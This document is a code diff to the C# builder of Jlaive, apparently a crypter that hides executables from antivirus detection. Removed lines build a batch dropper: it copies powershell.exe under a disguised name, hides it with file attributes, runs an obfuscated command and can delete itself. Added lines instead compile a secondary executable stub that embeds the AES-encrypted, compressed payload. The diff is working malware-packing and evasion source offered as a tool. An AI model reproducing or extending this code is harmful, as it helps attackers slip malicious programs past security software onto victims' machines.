@@ -3,8 +3,10 @@ using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Reflection;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using Microsoft.CSharp;
 
 using static Jlaive.Utils;
@@ -60,6 +62,9 @@ namespace Jlaive
             Console.ForegroundColor = ConsoleColor.Gray;
             byte[] pbytes = File.ReadAllBytes(_input);
 
+            Console.WriteLine("Modifying payload...");
+            pbytes = Patcher.Fix(pbytes);
+
             Console.WriteLine("Encrypting payload...");
             AesManaged aes = new AesManaged();
             byte[] payload_enc = Encrypt(Compress(pbytes), aes.Key, aes.IV);
@@ -98,31 +103,32 @@ namespace Jlaive
             aes = new AesManaged();
             byte[] stub_enc = Encrypt(Compress(stubbytes), aes.Key, aes.IV);
 
-            Console.WriteLine("Creating PowerShell command...");
-            string command = StubGen.CreatePS(aes.Key, aes.IV, _hidden, rng);
+            Console.WriteLine("Creating secondary stub...");
+            stub = StubGen.CreateCLI(aes.Key, aes.IV, rng);
             aes.Dispose();
 
-            Console.WriteLine("Constructing batch file...");
-            StringBuilder toobf = new StringBuilder();
-            toobf.AppendLine("rem https://github.com/ch2sh/Jlaive");
-            toobf.AppendLine(command);
-            StringBuilder output = new StringBuilder();
-            output.AppendLine("@echo off");
-            output.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ""%~dp0%~nx0.exe"" /y");
-            output.AppendLine("attrib +s +h \"%~dp0%~nx0.exe\"");
-            output.AppendLine("cls");
-            output.AppendLine("cd %~dp0");
-            if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
-            else output.AppendLine(toobf.ToString());
-            output.AppendLine("attrib -s -h \"%~dp0%~nx0.exe\"");
-            output.AppendLine("del \"%~dp0%~nx0.exe\"");
-            if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
-            output.AppendLine("exit /b");
-            output.Append(Convert.ToBase64String(stub_enc));
-
-            Console.WriteLine("Writing output...");
-            _output = Path.ChangeExtension(_output, "bat");
-            File.WriteAllText(_output, output.ToString(), Encoding.ASCII);
+            Console.WriteLine("Compiling secondary stub...");
+            File.WriteAllText("payload.txt", Convert.ToBase64String(stub_enc));
+            csc = new CSharpCodeProvider();
+            parameters = new CompilerParameters()
+            {
+                GenerateExecutable = true,
+                OutputAssembly = "out.exe",
+                IncludeDebugInformation = false
+            };
+            parameters.EmbeddedResources.Add("payload.txt");
+            results = csc.CompileAssemblyFromSource(parameters, stub);
+            if (results.Errors.Count > 0)
+            {
+                List<string> errors = new List<string>();
+                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}");
+                Console.ResetColor();
+                Environment.Exit(1);
+                return;
+            }
+            File.Delete("payload.txt");
 
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine($"Build successful!\nOutput path: {_output}");
